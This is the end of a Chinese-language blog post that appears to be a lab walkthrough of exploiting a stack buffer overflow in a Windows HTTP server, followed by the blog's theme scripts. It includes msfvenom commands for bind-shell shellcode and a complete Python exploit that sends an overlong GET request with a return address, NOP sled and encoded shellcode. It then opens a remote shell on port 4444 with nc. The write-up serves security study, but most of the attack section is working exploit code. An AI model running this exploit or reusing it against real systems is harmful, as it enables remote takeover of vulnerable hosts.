+<p>执行脚本后 OllyDbg 的 EIP 已显示为<code>7548A52C</code>，按 F7 进行下一步<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.25.32.png" alt="截屏2022-02-27 下午1.25.32"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.35.59.png" alt="截屏2022-02-27 下午1.35.59"></p>
+<p>显示<code>02F838C4</code>，而这就是 ESP 寄存器里的地址，说明我们已经可以修改 ESP 寄存器让程序按照我们的意愿执行，接下来使用 MSF 生成 shellcode，通过 <code>-b</code> 参数去除 http 协议当中坏字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l //查看所有可生成的 payload，以下payload默认开放端口为4444</span><br><span class="line">msfvenom -p windows/x64/shell_bind_tcp --list-options //查看64位 payload 详情</span><br><span class="line">msfvenom -p windows/x64/shell_bind_tcp -b <span class="string">&quot;\x00\x0a\x0d&quot;</span> -f python //64位</span><br><span class="line">msfvenom -p windows/shell_bind_tcp -b <span class="string">&quot;\x00\x0a\x0d&quot;</span> -f python //32位</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%882.37.44.png" alt="截屏2022-02-27 下午2.37.44"></p>
+<p>将生成的 shellcode 替换字符 C，但是 EIP 如果与 shellcode 太近会出现前几位字符被忽略的问题，可以填充 nop 来避免这一问题的产生，nop 代表空操作，程序遇到 nop 会自动跳过并自动执行之后的第一条指令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target_address = <span class="string">&quot;192.168.0.102&quot;</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xef\xff\xff\xff\x48\xbb\xbb\x18\xbd\xae\xa0\x62\x14&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa7\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x47\x50\x3e\x4a\x50\x8a\xd4\xa7\xbb\x18\xfc\xff\xe1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x32\x46\xf6\xed\x50\x8c\x7c\xc5\x2a\x9f\xf5\xdb\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x36\xfc\xb8\x2a\x9f\xf5\x9b\x50\x36\xdc\xf0\x2a\x1b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x10\xf1\x52\xf0\x9f\x69\x2a\x25\x67\x17\x24\xdc\xd2&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa2\x4e\x34\xe6\x7a\xd1\xb0\xef\xa1\xa3\xf6\x4a\xe9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x59\xec\xe6\x2b\x30\x34\x2c\xf9\x24\xf5\xaf\x70\xe9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x94\x2f\xbb\x18\xbd\xe6\x25\xa2\x60\xc0\xf3\x19\x6d&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfe\x2b\x2a\x0c\xe3\x30\x58\x9d\xe7\xa1\xb2\xf7\xf1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf3\xe7\x74\xef\x2b\x56\x9c\xef\xba\xce\xf0\x9f\x69&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x2a\x25\x67\x17\x59\x7c\x67\xad\x23\x15\x66\x83\xf8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc8\x5f\xec\x61\x58\x83\xb3\x5d\x84\x7f\xd5\xba\x4c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe3\x30\x58\x99\xe7\xa1\xb2\x72\xe6\x30\x14\xf5\xea&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x2b\x22\x08\xee\xba\xc8\xfc\x25\xa4\xea\x5c\xa6\x6b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x59\xe5\xef\xf8\x3c\x4d\xfd\xfa\x40\xfc\xf7\xe1\x38&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5c\x24\x57\x38\xfc\xfc\x5f\x82\x4c\xe6\xe2\x42\xf5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x25\xb2\x8b\x43\x58\x44\xe7\xe0\xe7\x1e\x15\x67\x95&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe4\x2b\x8f\xae\xa0\x23\x42\xee\x32\xfe\xf5\x2f\x4c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc2\x15\xa7\xbb\x51\x34\x4b\xe9\xde\x16\xa7\xaa\x44&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbd\xae\xa0\x62\x55\xf3\xf2\x91\x59\xe2\x29\x93\x55&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x1d\xf7\x6f\x9b\xa9\x5f\xb7\x58\x2e\x51\x70\xbc\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa0\x62\x4d\xe6\x01\x31\x3d\xc5\xa0\x9d\xc1\xf7\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x55\x8c\x67\xed\x53\xd4\xef\x44\xd8\xf5\x27\x62\x2a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xeb\x67\xf3\x91\x7c\xef\x1a\x88\x1b\x78\x5b\xe7\x68&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe6\x29\xa5\x7e\xb7\xfa\x40\xf1\x27\x42\x2a\x9d\x5e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xa2\x7f\x75\x97\x05\xeb\x72\xf3\x29\x6f\xe6\x29&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x9b\x55\x1d\x0c\xf1\x85\x51\x5f\xb7\x59\x96\x7b\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8c\x7c\xe8\xeb\xed\xe6\x01\x6c\x51\x95\x41\x9d\xc1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xef\x32\xe1\xf5\x27\x67\x23\xae\xd2\xd5\x55\xdc\x51&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x75\x2a\x95\x63\x1b\x1a\xbd\xae\xe9\xda\x77\xca\xdf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x18\xbd\xae\xa0\x62\x55\xf7\xfa\x48\xf5\x27\x42\x35&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\xf0\xf6\x29\x7d\xc4\xad\x3b\x55\xf7\x59\xe4\xdb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x69\xe4\x46\x40\xa6\xba\x50\x30\xea\x84\x7a\xd2\xa7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd3\x50\x34\x48\xf6\x32\x55\xf7\xfa\x48\xfc\xfe\xe9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x9d\xd4\xe6\xeb\x51\x42\x66\xed\xeb\xd5\xeb\x32\xd9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfc\x14\xd9\xae\x2b\x21\x44\xcd\xf5\x9f\x72\x2a\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6d\x30\x16\xfc\x14\xa8\xe5\x09\xc7\x44\xcd\x06\x5e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x15\xc0\x42\xe6\x01\xbe\x28\x13\x3d\x9d\xc1\xef\x38&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xdc\x95\x92\xa6\x1e\x1e\x27\x40\xf8\xc8\xab\x1b\x25&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x07\xd5\xd4\x72\xbd\xf7\xe1\xeb\xce\x58\x6e\x18\xbd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xae\xa0\x62\x14\xa7&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;GET &quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">1787</span> + <span class="string">&quot;\x2C\xA5\x48\x75&quot;</span> + <span class="string">&quot;\x90&quot;</span> * <span class="number">8</span> + buf + <span class="string">&quot; HTTP/1.1\r\n\r\n&quot;</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = sock.connect((target_address, target_port))</span><br><span class="line">sock.send(buffer)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<p>执行代码后查看 0llyDbg shellcode 未直接加载，这是由于该漏洞只在 windows XP 下生效<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%883.28.37.png" alt="截屏2022-02-27 下午3.28.37"><br>将目标靶机切换为 Windows XP，执行后连接目标 4444 端口成功获得目标shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.106 4444</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-03-01%20%E4%B8%8A%E5%8D%8812.47.05.png" alt="截屏2022-03-01 上午12.47.05"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/f2d5c746/">HTB: Querier<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
